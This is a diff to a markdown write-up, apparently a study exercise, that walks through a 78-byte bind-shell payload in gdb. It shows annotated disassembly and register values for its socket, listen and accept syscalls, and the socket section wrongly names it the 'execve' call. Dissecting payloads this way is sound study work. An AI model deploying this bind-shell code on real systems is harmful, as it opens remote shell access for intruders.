@@ -32,6 +32,8 @@ The payload is only 78 bytes and it requires the following parameters:
 - `LPORT`: The port to listen for the incoming connection
 - `RHOST`: The target address
 
+> NOTE: In the captures of `gdb`, comments are especified with the `<==` symbol. This is added when want to comment what's going on in the debugger.
+
 ### Creating the Shellcode
 ---
 Will execute the `ls -l` command. Decided to use a command that can receive options to check how the payload handles it. Also added the full path to make the command string a 7 bytes length only. Let's generate the payload:
@@ -190,9 +192,109 @@ All looks good, let's dissect the functionality.
 
 #### Section 1: `sys_socket`
 
-
-
-
+In this section, the `execve` call is to be used. From it's man page can get the function definition:
+```c
+int socket(int domain, int type, int protocol);
+```
+Then registers for this syscall need to get the following values:
+- RAX gets the syscall number, 0x29
+- RDI gets the domain. As it's an IPv4 connection, value has to be 2 (AF_INET)
+- RSI gets the type of the connection. As it's a TCP oriented connection, value has to be 0x01 (SOCK_STREAM)
+- RDX gets the protocol. As it's an IP connection, value has to be 0x00
+Let's debug this part, reviewing that registers get this values before the syscall, and understanding what's done in the code:
+```asm
+(gdb) stepi
+0x0000555555558063 in code ()
+(gdb) stepi
+0x0000555555558066 in code ()
+(gdb) stepi
+0x0000555555558068 in code ()
+(gdb) stepi
+0x000055555555806a in code ()
+(gdb) stepi
+0x000055555555806b in code ()
+(gdb) stepi
+0x000055555555806d in code ()
+(gdb) disassemble 
+Dump of assembler code for function code:
+   0x0000555555558060 <+0>:	xor    rsi,rsi        <== ZEROes RSI
+   0x0000555555558063 <+3>:	mul    rsi            <== RAX <- 0 and RDX <- 0
+   0x0000555555558066 <+6>:	inc    esi            <== RSI <- 1 for SOCK_STREAM
+   0x0000555555558068 <+8>:	push   0x2            <== RDI <- 2 for AF_INET
+   0x000055555555806a <+10>:	pop    rdi
+   0x000055555555806b <+11>:	mov    al,0x29        <== RAX <- 0x29 for syscall number
+=> 0x000055555555806d <+13>:	syscall 
+**_REMOVED_**
+End of assembler dump.
+(gdb) 
+```
+At this point, let's review that registers got the right values:
+```asm
+(gdb) info registers rax rdi rsi rdx
+rax            0x29                41
+rdi            0x2                 2
+rsi            0x1                 1
+rdx            0x0                 0
+(gdb) 
+```
+Then the syscall can be run, as the parameters are correct. Remember that this syscall returns in RAX the socket descriptor.
+```asm
+(gdb) stepi
+0x000055555555806f in code ()
+```
+#### Section 2: `sys_listen`
+Here in this section the `listen` call. From the man page:
+```c
+int listen(int sockfd, int backlog);
+```
+Values for registers for this call have to be:
+- RAX gets the syscall number, 0x32
+- RDI gets the sock_descriptor
+- RSI gets the backlog, 0x00
+Let's understand the code here:
+```asm
+(gdb) stepi
+0x0000555555558070 in code ()
+(gdb) stepi
+0x0000555555558071 in code ()
+(gdb) stepi
+0x0000555555558072 in code ()
+(gdb) stepi
+0x0000555555558073 in code ()
+(gdb) stepi
+0x0000555555558075 in code ()
+(gdb) disassemble 
+Dump of assembler code for function code:
+**_REMOVED_**   
+   0x000055555555806f <+15>:	push   rdx         <== Stack <- 0x00. RDX been zero'ed at +3
+   0x0000555555558070 <+16>:	pop    rsi         <== RSI <- 0 for the parameter
+   0x0000555555558071 <+17>:	push   rax         <== Pushes the socket descriptor in the stack
+   0x0000555555558072 <+18>:	pop    rdi         <== RDI <- socket descriptor. Pop'ed from stack
+   0x0000555555558073 <+19>:	mov    al,0x32     <== RAX <- Syscall number
+=> 0x0000555555558075 <+21>:	syscall 
+**_REMOVED_**
+End of assembler dump.
+(gdb) 
+```
+Everyting looks correct. Let's check if the registers have the right values before the syscall:
+```asm
+(gdb) info registers rax rdi rsi
+rax            0x32                50
+rdi            0x3                 3
+rsi            0x0                 0
+(gdb) 
+```
+Good. s expected.
+#### Section 3: `sys_accept`
+For the`accept` call, it's defined as:
+```c
+int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
+```
+Registers need this values:
+- RAX for the syscall number, 0x2b
+- RDI for the socket descriptor, that's already in RDI from the previous section (value "3")
+- RSI a pointer to the sockaddr
+- RDX the length of this struct
 
 
 
